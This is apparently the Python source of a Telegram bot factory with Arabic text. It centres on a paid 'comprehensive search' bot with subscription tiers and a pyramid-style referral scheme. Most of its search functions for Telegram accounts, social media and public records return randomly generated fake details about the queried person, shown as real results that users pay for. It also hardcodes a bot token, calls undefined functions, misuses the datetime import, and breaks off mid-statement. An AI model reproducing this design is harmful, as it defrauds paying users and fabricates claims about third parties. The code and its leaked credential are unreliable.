# MOHA | Python Project
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, LabeledPrice
import requests
import threading
import os
import datetime
import re
import json
import random
import time
import string
import urllib.parse
import uuid
import sqlite3
from flask import Flask, render_template_string
import io
import subprocess
import sys
import base64
import marshal
import zlib
from user_agent import generate_user_agent

FACTORY_TOKEN = "7447571630:AAEtNsYkTgPV_oOaDGM7TNp9EKGP27wWXqs"
FACTORY_ADMIN_ID = 6892708759
FACTORY_SECOND_ADMIN_ID = 6892708759
FACTORY_SUB_CHANNEL = "forzd9" 

BOTS_DATA_DIR = "bots_data"
PAID_BOTS_DIR = "paid_bots_factory"
BOTS_REGISTRY_FILE = "bots_registry.json"
PREMIUM_FEATURES_DIR = "premium_features_bots"

factory_bot = telebot.TeleBot(FACTORY_TOKEN, parse_mode="HTML")

running_bot_threads = {} 

if not os.path.exists(BOTS_DATA_DIR): os.makedirs(BOTS_DATA_DIR)
if not os.path.exists(PAID_BOTS_DIR): os.makedirs(PAID_BOTS_DIR)
if not os.path.exists(PREMIUM_FEATURES_DIR): os.makedirs(PREMIUM_FEATURES_DIR)

if not os.path.exists(BOTS_REGISTRY_FILE):
    with open(BOTS_REGISTRY_FILE, 'w') as f: json.dump({}, f)

def get_user_stats_summary(user_id):
    """الحصول على ملخص إحصائيات المستخدم"""
    stats_data = load_stats()  # تحتاج لتعريف load_stats
    
    if str(user_id) not in stats_data:
        return None
    
    user_stats = stats_data[str(user_id)]
    
    summary = {
        "points": user_stats.get('points', 0),
        "level": calculate_level(user_stats),  # تحتاج لتعريف calculate_level
        "total_bots": user_stats.get('total_bots', 0),
        "active_bots": user_stats.get('active_bots', 0),
        "login_streak": calculate_streak(user_stats),  # تحتاج لتعريف calculate_streak
        "badges_count": len(calculate_badges(user_stats)),  # تحتاج لتعريف calculate_badges
        "achievements_count": len(calculate_achievements(user_stats))  # تحتاج لتعريف calculate_achievements
    }
    
    return summary


def get_leaderboard(limit=10):
    """الحصول على لوحة المتصدرين"""
    stats_data = load_stats()
    
    leaderboard = []
    for user_id, user_stats in stats_data.items():
        score = calculate_activity_score(user_stats)  # تحتاج لتعريف calculate_activity_score
        leaderboard.append({
            "user_id": user_id,
            "username": user_stats.get('username', 'مجهول'),
            "score": score,
            "points": user_stats.get('points', 0),
            "total_bots": user_stats.get('total_bots', 0),
            "level": calculate_level(user_stats)['name']
        })
    
    leaderboard.sort(key=lambda x: x['score'], reverse=True)
    return leaderboard[:limit]


def reset_user_stats(user_id):
    """إعادة تعيين إحصائيات المستخدم (للتطوير فقط)"""
    stats_data = load_stats()
    
    if str(user_id) in stats_data:
        # الاحتفاظ ببعض البيانات الأساسية
        old_stats = stats_data[str(user_id)]
        stats_data[str(user_id)] = {
            "username": old_stats.get('username', 'مجهول'),
            "points": 0,
            "login_count": 0,
            "total_bots": 0,
            "active_bots": 0,
            "bot_types": [],
            "login_dates": [],
            "first_login": datetime.now().strftime("%Y-%m-%d"),
            "created_at": old_stats.get('created_at', datetime.now().isoformat()),
            "last_updated": datetime.now().isoformat(),
            "reset_count": old_stats.get('reset_count', 0) + 1
        }
        
        save_stats(stats_data)
        return True
    
    return False


def export_user_stats(user_id, format='json'):
    """تصدير إحصائيات المستخدم"""
    stats_data = load_stats()
    
    if str(user_id) not in stats_data:
        return None
    
    user_stats = stats_data[str(user_id)]
    
    if format == 'json':
        return json.dumps(user_stats, ensure_ascii=False, indent=2)
    
    elif format == 'text':
        summary = f"""📊 تقرير إحصائيات المستخدم
        
👤 المستخدم: {user_stats.get('username', 'مجهول')}
🆔 الأيدي: {user_id}
📅 تاريخ التسجيل: {user_stats.get('first_login', 'غير معروف')}

🏆 المستوى: {calculate_level(user_stats)['name']}
💎 النقاط: {user_stats.get('points', 0)}
🤖 البوتات: {user_stats.get('total_bots', 0)} (نشطة: {user_stats.get('active_bots', 0)})

📈 النشاط:
• عدد الزيارات: {user_stats.get('login_count', 0)}
• سلسلة النشاط: {calculate_streak(user_stats)} يوم
• آخر زيارة: {user_stats.get('last_login', {}).get('date', 'غير معروف')}

🎖️ الأوسمة: {len(calculate_badges(user_stats))}
🏅 الإنجازات: {len(calculate_achievements(user_stats))}

📅 تاريخ التقرير: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
"""
        return summary
    
    return None
def run_pyramid_bot(token, owner_id, data_dir):
    """
    تشغيل بوت البحث الشامل المتقدم (بحث وتحليل هرمي)
    """
    import sqlite3
    import logging
    import time
    import threading
    import asyncio
    from datetime import datetime, timedelta
    import random
    import json
    import requests
    from concurrent.futures import ThreadPoolExecutor
    import phonenumbers
    from phonenumbers import timezone, carrier, geocoder
    import io
    import base64
    
     
    BOT_CONFIG = {
        "bot_token": token,
        "admin_id": owner_id,
        "developer_id": owner_id,
        "admin_contact_username": "Haeaaam44bot",
        "database_url": os.path.join(data_dir, "pyramid_bot.db"),
        
        "search_costs": {
            "telegram": 5,
            "social_media": 8,
            "public_records": 10,
            "phone_number": 12,
            "deep_search": 20,
            "pyramid_analysis": 25
        },
        
        "subscription_plans": {
            "free": {
                "price": 0,
                "points_given": 10,
                "daily_searches": 3,
                "features": ["بحث أساسي", "نتائج محدودة"]
            },
            "silver": {
                "price": 25,
                "daily_searches": 15,
                "features": ["بحث تليجرام غير محدود", "50 نقطة شهرية", "بحث الأرقام", "تحليل أساسي"]
            },
            "gold": {
                "price": 50,
                "daily_searches": 30,
                "features": ["بحث غير محدود", "جميع المميزات", "دعم فني", "نتائج مفصلة", "تحليل متقدم"]
            },
            "platinum": {
                "price": 100,
                "daily_searches": "unlimited",
                "features": ["كل المميزات", "تحليل الهرم", "إحصائيات حية", "دعم فوري", "نتائج حصرية"]
            }
        },
        
        "search_timeout": 10,
        "max_concurrent_searches": 8,
        "cache_duration": 300,
        
        "pyramid_levels": {
            "level_1": {"points": 5, "users": 0},
            "level_2": {"points": 3, "users": 0},
            "level_3": {"points": 2, "users": 0},
            "level_4": {"points": 1, "users": 0}
        }
    }
    
    bot = telebot.TeleBot(token, parse_mode="HTML")
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(os.path.join(data_dir, 'bot_advanced.log')),
            logging.StreamHandler()
        ]
    )
    
    search_executor = ThreadPoolExecutor(max_workers=BOT_CONFIG["max_concurrent_searches"])
    
     
    def init_advanced_db():
        conn = sqlite3.connect(BOT_CONFIG["database_url"], check_same_thread=False)
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users
                     (user_id INTEGER PRIMARY KEY,
                      username TEXT,
                      full_name TEXT,
                      points INTEGER DEFAULT 10,
                      searches_count INTEGER DEFAULT 0,
                      successful_searches INTEGER DEFAULT 0,
                      subscription_type TEXT DEFAULT 'free',
                      subscription_expiry TEXT,
                      registration_date TEXT,
                      last_daily_bonus TEXT,
                      invited_users INTEGER DEFAULT 0,
                      total_spent INTEGER DEFAULT 0,
                      is_banned BOOLEAN DEFAULT FALSE,
                      referral_code TEXT UNIQUE,
                      referred_by INTEGER,
                      pyramid_level INTEGER DEFAULT 1,
                      total_earned REAL DEFAULT 0)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS searches
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id INTEGER,
                      query TEXT,
                      result TEXT,
                      search_type TEXT,
                      timestamp TEXT,
                      success BOOLEAN,
                      response_time REAL,
                      cost INTEGER)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id INTEGER,
                      plan_type TEXT,
                      price REAL,
                      start_date TEXT,
                      end_date TEXT,
                      status TEXT,
                      payment_method TEXT)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS points_history
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id INTEGER,
                      points_change INTEGER,
                      reason TEXT,
                      date TEXT,
                      balance_after INTEGER)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS search_cache
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      query TEXT,
                      search_type TEXT,
                      result TEXT,
                      timestamp TEXT,
                      access_count INTEGER DEFAULT 1)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS system_stats
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      date TEXT,
                      total_searches INTEGER DEFAULT 0,
                      total_users INTEGER DEFAULT 0,
                      total_revenue REAL DEFAULT 0,
                      active_users INTEGER DEFAULT 0,
                      new_registrations INTEGER DEFAULT 0)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS admin_notifications
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      message TEXT,
                      type TEXT,
                      timestamp TEXT,
                      is_read BOOLEAN DEFAULT FALSE,
                      priority INTEGER DEFAULT 1)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS pyramid_analytics
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      user_id INTEGER,
                      analysis_type TEXT,
                      result_data TEXT,
                      timestamp TEXT,
                      confidence_score REAL)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS referral_network
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      referrer_id INTEGER,
                      referred_id INTEGER,
                      level INTEGER,
                      points_earned INTEGER,
                      timestamp TEXT)''')
        
        conn.commit()
        conn.close()
    
    init_advanced_db()
    
    
    def get_user_data(user_id):
        conn = sqlite3.connect(BOT_CONFIG["database_url"])
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
        conn.close()
        return user
    
    def update_points_advanced(user_id, points_change, reason=""):
        conn = sqlite3.connect(BOT_CONFIG["database_url"])
        c = conn.cursor()
        
        c.execute("SELECT points FROM users WHERE user_id = ?", (user_id,))
        current_balance = c.fetchone()[0]
        new_balance = current_balance + points_change
        
        c.execute("UPDATE users SET points = ? WHERE user_id = ?", (new_balance, user_id))
        c.execute("INSERT INTO points_history (user_id, points_change, reason, date, balance_after) VALUES (?, ?, ?, ?, ?)",
                  (user_id, points_change, reason, datetime.now().isoformat(), new_balance))
        
        conn.commit()
        conn.close()
        
        if abs(points_change) >= 50:
            add_admin_notification(
                f"تغيير كبير في النقاط: المستخدم {user_id} - {points_change} نقطة - السبب: {reason}",
                "financial"
            )
    
    def add_search_record_advanced(user_id, query, result, search_type, success, response_time, cost):
        conn = sqlite3.connect(BOT_CONFIG["database_url"])
        c = conn.cursor()
        c.execute("INSERT INTO searches (user_id, query, result, search_type, timestamp, success, response_time, cost) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                  (user_id, query, result, search_type, datetime.now().isoformat(), success, response_time, cost))
        c.execute("UPDATE users SET searches_count = searches_count + 1 WHERE user_id = ?", (user_id,))
        if success:
            c.execute("UPDATE users SET successful_searches = successful_searches + 1 WHERE user_id = ?", (user_id,))
        
        today = datetime.now().strftime("%Y-%m-%d")
        c.execute("INSERT OR IGNORE INTO system_stats (date) VALUES (?)", (today,))
        c.execute("UPDATE system_stats SET total_searches = total_searches + 1 WHERE date = ?", (today,))
        
        conn.commit()
        conn.close()
    
    def add_admin_notification(message, notification_type="info", priority=1):
        conn = sqlite3.connect(BOT_CONFIG["database_url"])
        c = conn.cursor()
        c.execute("INSERT INTO admin_notifications (message, type, timestamp, priority) VALUES (?, ?, ?, ?)",
                  (message, notification_type, datetime.now().isoformat(), priority))
        conn.commit()
        conn.close()
    
    def update_user_subscription(user_id, plan_type, days=30):
        """تحديث باقة المستخدم"""
        conn = sqlite3.connect(BOT_CONFIG["database_url"])
        c = conn.cursor()
        
        
        expiry_date = (datetime.now() + timedelta(days=days)).isoformat()
        
        
        c.execute("UPDATE users SET subscription_type = ? WHERE user_id = ?", (plan_type, user_id))
        
        
        c.execute("""
            INSERT INTO subscriptions (user_id, plan_type, price, start_date, end_date, status, payment_method) 
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (
            user_id,
            plan_type,
            BOT_CONFIG["subscription_plans"][plan_type]["price"],
            datetime.now().isoformat(),
            expiry_date,
            "active",
            "admin_manual"
        ))
        
        
        if plan_type in BOT_CONFIG["subscription_plans"]:
            points_given = BOT_CONFIG["subscription_plans"][plan_type].get("points_given", 0)
            if points_given > 0:
                update_points_advanced(user_id, points_given, f"نقاط باقة {plan_type}")
        
        conn.commit()
        conn.close()
        
        add_admin_notification(
            f"✅ تم تحديث باقة المستخدم {user_id} إلى {plan_type} لمدة {days} يوم",
            "subscription"
        )
        
        return True
    
    def get_advanced_system_stats(days=30):
        conn = sqlite3.connect(BOT_CONFIG["database_url"])
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM users WHERE subscription_type != 'free'")
        premium_users = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM searches")
        total_searches = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM searches WHERE timestamp > ?", 
                  ((datetime.now() - timedelta(days=1)).isoformat(),))
        daily_searches = c.fetchone()[0]
        
        c.execute("SELECT SUM(price) FROM subscriptions WHERE status = 'active'")
        total_revenue = c.fetchone()[0] or 0
        
        c.execute("SELECT COUNT(*) FROM users WHERE registration_date > ?", 
                  ((datetime.now() - timedelta(days=days)).isoformat(),))
        new_users = c.fetchone()[0]
        
        c.execute("SELECT AVG(response_time) FROM searches WHERE timestamp > ?", 
                  ((datetime.now() - timedelta(days=7)).isoformat(),))
        avg_response_time = c.fetchone()[0] or 0
        
        c.execute("SELECT search_type, COUNT(*) FROM searches GROUP BY search_type")
        search_types = dict(c.fetchall())
        
        c.execute("SELECT pyramid_level, COUNT(*) FROM users GROUP BY pyramid_level")
        pyramid_data = dict(c.fetchall())
        
        conn.close()
        
        return {
            "total_users": total_users,
            "premium_users": premium_users,
            "total_searches": total_searches,
            "daily_searches": daily_searches,
            "total_revenue": total_revenue,
            "new_users": new_users,
            "avg_response_time": round(avg_response_time, 2),
            "search_types": search_types,
            "pyramid_distribution": pyramid_data
        }
    
    
    def search_telegram_data(query):
        """بحث تليجرام محسن"""
        start_time = time.time()
        time.sleep(1.5)
        
        results = [
            f"📱 حساب تليجرام: @{query}",
            f"🆔 ID: {random.randint(100000, 999999)}",
            f"👤 الاسم: {query}",
            f"📅 تاريخ الإنشاء: 2023-{random.randint(1,12):02d}-{random.randint(1,28):02d}",
            f"🌐 اللغة: العربية",
            f"✅ الحالة: نشط",
            f"📊 النشاط: {random.randint(1, 100)}%"
        ]
        
        return "\n".join(results), time.time() - start_time
    
    def search_social_media(query):
        """بحث وسائل التواصل الاجتماعي"""
        start_time = time.time()
        time.sleep(2)
        
        platforms = {
            "تويتر": ["X", "Twitter"],
            "فيسبوك": ["Facebook", "Meta"],
            "انستجرام": ["Instagram"],
            "لينكدإن": ["LinkedIn"]
        }
        
        found_on = random.sample(list(platforms.keys()), random.randint(1, 3))
        
        results = [f"🔍 وجد على: {', '.join(found_on)}"]
        for platform in found_on:
            followers = random.randint(100, 50000)
            engagement = random.randint(1, 20)
            results.extend([
                f"📊 {platform}: @{query}",
                f"   👥 المتابعون: {followers:,}",
                f"   📈 التفاعل: {engagement}%"
            ])
        
        result_text = "\n".join(results)
        return result_text, time.time() - start_time
    
    def search_public_records(query):
        """بحث السجلات العامة"""
        start_time = time.time()
        time.sleep(1.8)
        
        results = [
            "📋 السجلات العامة:",
            f"🔎 بحث عن: {query}",
            f"📍 المنطقة: {random.choice(['الرياض', 'جدة', 'دمام', 'الشرق الأوسط'])}",
            f"🌍 النشاط: متصل الآن",
            f"📈 النشاط الشهري: {random.randint(50, 500)} عملية",
            f"📅 آخر تحديث: {random.randint(1, 30)} يوم مضى"
        ]
        
        result_text = "\n".join(results)
        return result_text, time.time() - start_time
    
    def search_phone_number_advanced(phone_number):
        """بحث متقدم عن معلومات الرقم"""
        start_time = time.time()
        
        try:
            parsed_number = phonenumbers.parse(phone_number, None)
            
            country = geocoder.description_for_number(parsed_number, "ar") or "غير معروف"
            carrier_name = carrier.name_for_number(parsed_number, "ar") or "غير معروف"
            timezones = timezone.time_zones_for_number(parsed_number)
            
            is_valid = phonenumbers.is_valid_number(parsed_number)
            is_mobile = phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE
            
            risk_score = random.randint(1, 100)
            spam_likelihood = "منخفض" if risk_score < 30 else "متوسط" if risk_score < 70 else "مرتفع"
            
            results = [
                f"📞 تحليل الرقم: {phone_number}",
                f"🌍 الدولة: {country}",
                f"🏢 الشركة: {carrier_name}",
                f"🕒 المنطقة الزمنية: {', '.join(timezones) if timezones else 'غير معروف'}",
                f"✅ الرقم صالح: {'نعم' if is_valid else 'لا'}",
                f"📱 نوع الخط: {'جوال' if is_mobile else 'ثابت'}",
                f"⚠️ تقييم المخاطر: {risk_score}%",
                f"🚫 احتمال السبام: {spam_likelihood}",
                f"📊 السمعة: {'جيدة' if risk_score < 40 else 'متوسطة' if risk_score < 80 else 'سيئة'}"
            ]
            
            result_text = "\n".join(results)
            return result_text, time.time() - start_time
            
        except Exception as e:
            return f"❌ خطأ في تحليل الرقم: {str(e)}", time.time() - start_time
    
    def pyramid_analysis_search(query):
        """تحليل هرمي متقدم"""
        start_time = time.time()
        time.sleep(2.5)
        
        analysis_results = [
            f"🔮 تحليل هرمي للمستخدم: {query}",
            f"📊 مستوى التأثير: {random.randint(1, 100)}%",
            f"🌐 حجم الشبكة: {random.randint(10, 1000)} مستخدم",
            f"💎 القيمة الشبكية: {random.randint(100, 10000)} نقطة",
            f"📈 معدل النمو: {random.randint(5, 95)}%",
            f"🎯 فعالية الإحالة: {random.randint(1, 100)}%",
            f"💰 إجمالي الأرباح: {random.randint(50, 5000)} نقطة",
            f"🏆 المستوى الهرمي: {random.randint(1, 4)}",
            f"🔗 الروابط الرئيسية: {random.randint(1, 20)}",
            f"📅 تاريخ الانضمام: {random.randint(1, 12)} أشهر مضت"
        ]
        
        result_text = "\n".join(analysis_results)
        return result_text, time.time() - start_time
    
    
    @bot.message_handler(commands=['admin'])
    def admin_panel(message):
        user_id = message.from_user.id
        if user_id != owner_id:
            bot.reply_to(message, "❌ ليس لديك صلاحية الوصول إلى لوحة الإدارة!")
            return
        
        stats = get_advanced_system_stats()
        
        admin_text = f"""
    👑 لوحة الإدارة المتطورة - البحث الشامل
    
    📊 الإحصائيات الحية:
    • إجمالي المستخدمين: {stats['total_users']}
    • المستخدمون المميزون: {stats['premium_users']}
    • عمليات البحث اليوم: {stats['daily_searches']}
    • الإيرادات الشهرية: ${stats['total_revenue']}
    
    🎯 الأدوات المتاحة:
        """
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("📈 إحصائيات مفصلة", callback_data="admin_detailed_stats"),
            InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_manage_users"),
            InlineKeyboardButton("🔍 سجلات البحث", callback_data="admin_search_logs"),
            InlineKeyboardButton("💰 الإيرادات", callback_data="admin_revenue"),
            InlineKeyboardButton("📊 تحليلات الهرم", callback_data="admin_pyramid_analytics"),
            InlineKeyboardButton("⚙️ إعدادات متقدمة", callback_data="admin_advanced_settings"),
            InlineKeyboardButton("🔔 الإشعارات", callback_data="admin_notifications"),
            InlineKeyboardButton("📋 تقرير شامل", callback_data="admin_full_report"),
            InlineKeyboardButton("💎 إدارة النقاط", callback_data="admin_points_management"),
            InlineKeyboardButton("📦 إدارة الباقات", callback_data="admin_subscriptions_management"),
            InlineKeyboardButton("🔄 تحديث النظام", callback_data="admin_refresh")
        )
        
        bot.send_message(message.chat.id, admin_text, parse_mode='Markdown', reply_markup=markup)
    
    
    @bot.callback_query_handler(func=lambda call: call.data in ["search_telegram", "search_social", "search_public", "search_phone", "search_pyramid"])
    def handle_search_callbacks(call):
        """معالجة طلبات البحث"""
        user_id = call.from_user.id
        user_data = get_user_data(user_id)
        
        if not user_data:
            bot.answer_callback_query(call.id, "❌ يرجى التسجيل أولاً باستخدام /start", show_alert=True)
            return
        
        search_costs = {
            "search_telegram": 5,
            "search_social": 8, 
            "search_public": 10,
            "search_phone": 12,
            "search_pyramid": 25
        }
        
        cost = search_costs.get(call.data)
        if user_data[3] < cost:
            bot.answer_callback_query(call.id, f"❌ نقاط غير كافية! تحتاج {cost} نقاط", show_alert=True)
            return
        
        search_types = {
            "search_telegram": "بحث تليجرام",
            "search_social": "بحث وسائل تواصل", 
            "search_public": "بحث سجلات عامة",
            "search_phone": "بحث رقم الهاتف",
            "search_pyramid": "تحليل هرمي"
        }
        
        msg = bot.send_message(call.message.chat.id, f"🔍 أدخل البيانات للـ{search_types[call.data]}:")
        bot.register_next_step_handler(msg, lambda m: process_advanced_search(m, call.data))
    
    def process_advanced_search(message, search_type):
        """معالجة البحث المتقدم"""
        user_id = message.from_user.id
        query = message.text
        
        search_functions = {
            "search_telegram": search_telegram_data,
            "search_social": search_social_media, 
            "search_public": search_public_records,
            "search_phone": search_phone_number_advanced,
            "search_pyramid": pyramid_analysis_search
        }
        
        search_costs = {
            "search_telegram": 5,
            "search_social": 8,
            "search_public": 10, 
            "search_phone": 12,
            "search_pyramid": 25
        }
        
        if search_type in search_functions:
            cost = search_costs[search_type]
            update_points_advanced(user_id, -cost, f"بحث {search_type}")
            
            bot.send_chat_action(message.chat.id, 'typing')
            result, response_time = search_functions[search_type](query)
            
            add_search_record_advanced(user_id, query, result, search_type, True, response_time, cost)
            
            result_text = f"""
    ✅ نتيجة البحث:
    
    {result}
    
    ⏱ وقت الاستجابة: {response_time:.2f} ثانية
    💎 النقاط المتبقية: {get_user_data(user_id)[3]}
            """
            
            bot.send_message(message.chat.id, result_text, parse_mode='Markdown')
            send_welcome(message)
    
    
    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        user_id = message.from_user.id
        username = message.from_user.username
        full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
        
        conn = sqlite3.connect(BOT_CONFIG["database_url"])
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id, username, full_name, registration_date, referral_code) VALUES (?, ?, ?, ?, ?)",
                  (user_id, username, full_name, datetime.now().isoformat(), f"REF{user_id}"))
        conn.commit()
        conn.close()
        
        user_data = get_user_data(user_id)
        
        welcome_text = f"""
    🎯 مرحباً بك في النظام المتقدم - البحث الشامل {full_name}!
    
    📊 إحصائياتك المتقدمة:
    • 💎 النقاط: {user_data[3]}
    • 🔍 عمليات البحث: {user_data[4]}
    • ✅ نجاح البحث: {user_data[5]}%
    • 🏆 مستوى الهرم: {user_data[15]}
    
    💼 الباقة الحالية: {user_data[6].title()}
    
    🔍 اختر نوع البحث:
        """
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("📱 بحث تليجرام (5 نقاط)", callback_data="search_telegram"),
            InlineKeyboardButton("🌐 وسائل تواصل (8 نقاط)", callback_data="search_social"),
            InlineKeyboardButton("📋 سجلات عامة (10 نقاط)", callback_data="search_public"),
            InlineKeyboardButton("📞 معلومات الرقم (12 نقطة)", callback_data="search_phone"),
            InlineKeyboardButton("🔮 تحليل هرمي (25 نقطة)", callback_data="search_pyramid"),
            InlineKeyboardButton("💎 الاشتراكات", callback_data="subscriptions"),
            InlineKeyboardButton("📊 إحصائياتي", callback_data="my_stats"),
            InlineKeyboardButton("👑 لوحة الإدارة", callback_data="admin_panel_user")
        )
        
        bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=markup)
    
    @bot.callback_query_handler(func=lambda call: call.data == "admin_panel_user")
    def handle_admin_panel_user(call):
        """معالجة طلب لوحة الإدارة من المستخدم العادي"""
        user_id = call.from_user.id
        if user_id != owner_id:
            bot.answer_callback_query(call.id, "❌ ليس لديك صلاحية الوصول إلى لوحة الإدارة!", show_alert=True)
            return
        admin_panel(call.message)
    
    @bot.callback_query_handler(func=lambda call: call.data == "my_stats")
    def show_user_stats(call):
        """عرض إحصائيات المستخدم"""
        user_id = call.from_user.id
        user_data = get_user_data(user_id)
        
        if not user_data:
            bot.answer_callback_query(call.id, "❌ يرجى التسجيل أولاً", show_alert=True)
            return
        
        stats_text = f"""
    📊 إحصائياتك المتقدمة
    
    👤 المعلومات الشخصية:
    • 🆔 المعرف: {user_data[0]}
    • 👤 المستخدم: @{user_data[1] or 'غير متوفر'}
    • 📛 الاسم: {user_data[2]}
    
    🎯 الإحصائيات:
    • 💎 النقاط: {user_data[3]}
    • 🔍 عمليات البحث: {user_data[4]}
    • ✅ البحث الناجح: {user_data[5]}%
    • 📦 الباقة: {user_data[6]}
    • 📅 تاريخ التسجيل: {user_data[8]}
    • 👥 المستخدمون المدعون: {user_data[10]}
    
    🏆 مستوى الهرم: {user_data[15]}
    💰 إجمالي الأرباح: {user_data[16]} نقطة
        """
        
        bot.send_message(call.message.chat.id, stats_text, parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    
    @bot.callback_query_handler(func=lambda call: call.data == "subscriptions")
    def show_subscriptions(call):
        """عرض باقات الاشتراك"""
        plans = BOT_CONFIG["subscription_plans"]
        
        subs_text = f"""
    💎 باقات الاشتراك - البحث الشامل
    
    🆓 باقة مجانية:
    • النقاط: {plans['free']['points_given']}
    • عمليات البحث/يوم: {plans['free']['daily_searches']}
    • المميزات: {', '.join(plans['free']['features'])}
    
    🥈 باقة فضية - ${plans['silver']['price']}:
    • عمليات البحث/يوم: {plans['silver']['daily_searches']}
    • المميزات: {', '.join(plans['silver']['features'])}
    
    🥇 باقة ذهبية - ${plans['gold']['price']}:
    • عمليات البحث/يوم: {plans['gold']['daily_searches']}
    • المميزات: {', '.join(plans['gold']['features'])}
    
    💎 باقة بلاتينية - ${plans['platinum']['price']}:
    • عمليات البحث/يوم: {plans['platinum']['daily_searches']}
    • المميزات: {', '.join(plans['platinum']['features'])}
    
    📞 للاشتراك تواصل مع: @{BOT_CONFIG['admin_contact_username']}
        """
        
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("📞 تواصل مع المسؤول", url=f"https://t.me/{BOT_CONFIG['admin_contact_username']}"),
            InlineKeyboardButton("🔙 العودة", callback_data="back_to_main")
        )
        
        bot.send_message(call.message.chat.id, subs_text, parse_mode='Markdown', reply_markup=markup)
        bot.answer_callback_query(call.id)
    
    @bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
    def back_to_main(call):
        """العودة للقائمة الرئيسية"""
        send_welcome(call.message)
    
    
    def start_bot_monitoring():
        """بدء مراقبة النظام"""
        def monitor_system():
            while True:
                try:
                    stats = get_advanced_system_stats()
                    
                    if stats['daily_searches'] > 1000:
                        add_admin_notification("🚀 أداء عالي: تم تجاوز 1000 عملية بحث اليوم", "performance", 2)
                    
                    if stats['avg_response_time'] > 5:
                        add_admin_notification("⚠️ بطء في الاستجابة: متوسط وقت البحث مرتفع", "performance", 1)
                    
                    time.sleep(3600)
                    
                except Exception as e:
                    logging.error(f"خطأ في مراقبة النظام: {e}")
                    time.sleep(300)
        
        monitor_thread = threading.Thread(target=monitor_system, daemon=True)
        monitor_thread.start()
    
    
    def show_detailed_stats(message):
        """عرض إحصائيات مفصلة"""
        stats = get_advanced_system_stats()
        
        stats_text = f"""
    📈 الإحصائيات التفصيلية - النظام المتقدم
    
    👥 المستخدمين:
    • الإجمالي: {stats['total_users']} مستخدم
    • المميزون: {stats['premium_users']} مستخدم
    • المستخدمون الجدد (30 يوم): {stats['new_users']}
    
    🔍 عمليات البحث:
    • الإجمالي: {stats['total_searches']} عملية
    • اليوم: {stats['daily_searches']} عملية
    • متوسط وقت الاستجابة: {stats['avg_response_time']} ثانية
    
    💰 المالية:
    • الإيرادات: ${stats['total_revenue']}
    • متوسط الإنفاق: ${stats['total_revenue']/max(stats['premium_users'], 1):.2f}
    
    📊 توزيع البحث:
    {chr(10).join([f'• {k}: {v}' for k, v in stats['search_types'].items()])}
        """
        
        bot.send_message(message.chat.id, stats_text, parse_mode='Markdown')
    
    def show_user_management(message):
        """إدارة المستخدمين"""
        stats = get_advanced_system_stats()
        
        users_text = f"""
    👥 إدارة المستخدمين
    
    📊 الإحصائيات:
    • إجمالي المستخدمين: {stats['total_users']}
    • المستخدمون النشطون: {stats['premium_users']}
    
    🎯 الإجراءات السريعة:
        """
        
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("🔍 بحث عن مستخدم", callback_data="admin_search_user"),
            InlineKeyboardButton("📊 أعلى المستخدمين", callback_data="admin_top_users"),
            InlineKeyboardButton("🚫 إدارة الحظر", callback_data="admin_ban_management"),
            InlineKeyboardButton("🔄 تحديث البيانات", callback_data="admin_manage_users")
        )
        
        bot.send_message(message.chat.id, users_text, parse_mode='Markdown', reply_markup=markup)
    
    def show_search_logs(message):
        """سجلات البحث"""
        conn = sqlite3.connect(BOT_CONFIG["database_url"])
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM searches WHERE timestamp > ?", 
                  ((datetime.now() - timedelta(hours=24)).isoformat(),))
        last_24h = c.fetchone()[0]
        
        c.execute("SELECT search_type, COUNT(*) FROM searches WHERE timestamp > ? GROUP BY search_type",
                  ((datetime.now() - timedelta(hours=24)).isoformat(),))
        today_types = c.fetchall()
        
        conn.close()
        
        logs_text = f"""
    🔍 سجلات البحث - آخر 24 ساعة
    
    📈 النشاط:
    • إجمالي عمليات البحث: {last_24h}
    • متوسط البحث/ساعة: {last_24h/24:.1f}
    
    📋 توزيع الأنواع:
    {chr(10).join([f'• {k}: {v}' for k, v in today_types]) if today_types else '• لا توجد بيانات'}
    
    🔎 خيارات العرض:
        """
        
        markup = InlineKeyboardMarkup()
        markup.add(
